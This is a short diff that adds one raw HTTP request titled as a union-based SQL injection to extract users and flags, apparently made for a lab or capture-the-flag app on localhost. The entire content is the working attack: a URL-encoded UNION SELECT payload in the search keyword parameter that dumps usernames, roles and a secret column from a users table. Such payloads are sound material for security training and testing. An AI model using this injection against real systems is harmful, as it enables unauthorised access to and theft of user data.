@@ -1,0 +1,6 @@
+### Union-based SQL Injection Request (Extract users & flags)
+GET /search?keyword=%27+UNION+SELECT+id%2C+username%2C+secret_flag%2C+role%2C+0.0%2C+1+FROM+users+--+&category=ALL&mode=vulnerable HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Referer: http://localhost:8080/search.jsp
+Connection: keep-alive
